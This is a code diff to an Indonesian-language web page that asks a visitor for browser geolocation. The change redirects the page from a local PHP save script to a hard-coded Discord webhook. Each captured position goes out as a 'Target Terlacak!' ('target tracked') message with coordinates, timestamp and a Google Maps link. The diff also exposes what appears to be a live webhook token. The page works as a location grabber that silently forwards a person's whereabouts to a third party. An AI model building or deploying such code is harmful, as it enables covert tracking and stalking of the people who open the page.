@@ -21,40 +21,50 @@
     <p id="status"></p>
 
     <script>
+        // GANTI STRING DI BAWAH DENGAN URL WEBHOOK DISCORD ANDA
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1556260141547135036/X8xfxPSE-ZYHvIXyzNdyz_OvXFTJHzcWh65d8eXWALbB44x0ZbZT5MvVFvWU2sqbHBFx";
+
         document.getElementById('btnLacak').addEventListener('click', function() {
             const statusText = document.getElementById('status');
             statusText.innerText = "Meminta izin dari browser...";
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(kirimKeServer, showError);
+                navigator.geolocation.getCurrentPosition(kirimKeDiscord, showError);
             } else {
                 statusText.innerText = "Geolokasi tidak didukung oleh browser ini.";
             }
         });
 
-        // Fungsi jika lokasi berhasil ditangkap
-        function kirimKeServer(position) {
+        function kirimKeDiscord(position) {
             const statusText = document.getElementById('status');
-            statusText.innerText = "Lokasi didapatkan! Mengirim ke server...";
+            statusText.innerText = "Lokasi didapatkan! Mengirim data...";
 
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            const waktu = new Date().toLocaleString('id-ID');
+            
+            // Link Google Maps agar mudah diklik
+            const gmapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            // Mengirim data ke simpan.php di latar belakang menggunakan Fetch API
-            fetch('simpan.php', {
+            // Pesan yang akan dikirim ke Discord
+            const payload = {
+                content: `📍 **Target Terlacak!**\n**Waktu:** ${waktu}\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Google Maps:** ${gmapsLink}`
+            };
+
+            // Mengirim data menggunakan Fetch API
+            fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ lat: lat, lon: lon })
+                body: JSON.stringify(payload)
             })
-            .then(response => response.json())
-            .then(data => {
-                if(data.status === 'sukses') {
-                    statusText.innerText = "Selesai! Lokasi berhasil disimpan secara otomatis.";
+            .then(response => {
+                if(response.ok) {
+                    statusText.innerText = "Selesai! Lokasi berhasil dikirim.";
                     statusText.style.color = "green";
                 } else {
-                    statusText.innerText = "Error: " + data.pesan;
+                    statusText.innerText = "Gagal mengirim data.";
                     statusText.style.color = "red";
                 }
             })
@@ -64,7 +74,6 @@
             });
         }
 
-        // Fungsi jika terjadi error/pengguna menolak izin
         function showError(error) {
             const statusText = document.getElementById('status');
             statusText.style.color = "red";
